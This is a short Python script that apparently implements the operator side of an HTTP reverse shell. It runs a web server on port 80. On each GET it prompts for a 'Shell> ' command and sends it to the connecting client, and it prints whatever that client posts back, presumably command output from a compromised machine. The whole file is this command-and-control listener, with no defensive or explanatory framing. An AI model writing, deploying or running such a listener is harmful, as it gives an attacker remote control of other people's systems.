from http.server import BaseHTTPRequestHandler, HTTPServer
import socket

#   Required constants
HOST_ADDR = socket.gethostbyname(socket.gethostname())
PORT = 80

class http_handler(BaseHTTPRequestHandler):

    # Gets user input and send it to client with request headers
    def do_GET(user_input):
        command = input("Shell> ")
        user_input.send_response(200)
        user_input.send_header("Content-type", "text/html")
        user_input.end_headers()
        user_input.wfile.write(command.encode())

    # Gets data from the POST request & prints it out.    
    def do_POST(user_input):
        user_input.send_response(200)
        user_input.end_headers()
        request_length = int(user_input.headers['Content-Length'])
        request_data = user_input.rfile.read(request_length)
        print(request_data)
        
    

        
